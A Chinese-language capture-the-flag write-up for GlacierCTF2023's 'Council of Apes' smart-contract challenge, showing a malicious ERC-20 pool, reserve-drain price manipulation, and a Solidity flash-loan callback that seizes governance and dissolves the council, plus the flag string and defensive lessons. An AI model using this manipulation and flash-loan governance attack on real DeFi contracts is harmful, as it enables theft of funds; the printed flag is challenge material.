# GlacierCTF2023 - The Council of Apes

## 题目简述

目标是让 `CouncilOfApes.dissolved` 变为真。只有获得至少 $10^9$ 票并调用 `claimNewRank()` 成为 `GORILLA`，才能解散议会。`IcyExchange` 允许任意 Ape 创建 ERC-20 池，并按池内余额比值报价；它还提供带抵押的 ICY 闪电贷。

## 解题过程

先宣誓成为 Ape，部署一个自行控制余额且报告 `totalSupply() == 100000000` 的恶意 ERC-20，再支付 1 ether 为它创建池。初始池内有 100000 恶意币和 100000 ICY。

用 100000 恶意币换 ICY 时，公式

$$
\text{out}=\frac{\text{amount}\cdot B_{to}}{B_{from}}
$$

给出 100000，但合约把等于储备的输出截为 `B_to - 1`，所以攻击者拿走 99999 ICY，池中只剩 1 ICY。此时反向报价极端失真：以恶意币抵押借出 $10^9$ ICY，所需抵押最终被截为恶意币储备减一，仍低于合约的 $10^8$ 上限。

闪电贷回调中完成整条状态链：

```solidity
function receiveFlashLoan(uint256 amount) external {
    icyToken.approve(address(council), amount);
    council.buyBanana(amount);
    council.vote(address(this), amount);
    council.claimNewRank();

    council.issueBanana(amount, address(this));
    council.sellBanana(amount);

    council.dissolveCouncilOfTheApes(
        keccak256("Kevin come out of the basement, dinner is ready.")
    );
    icyToken.approve(address(exchange), type(uint256).max);
}
```

买入的香蕉用于投票并取得 `GORILLA`；成为 Alpha 后再铸出等量香蕉、卖回 ICY，以便偿还闪电贷。解散状态在同一交易内永久写入，最终得到：

```text
gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}
```

## 方法总结

攻击由三项信任错误组合而成：无权限创建任意资产池、仅凭即时储备报价、闪电贷接受攻击者定义语义的 ERC-20。价格上限并不能替代可信资产白名单和抗操纵 oracle；治理权也不应直接由同一交易内可借入的余额产生。
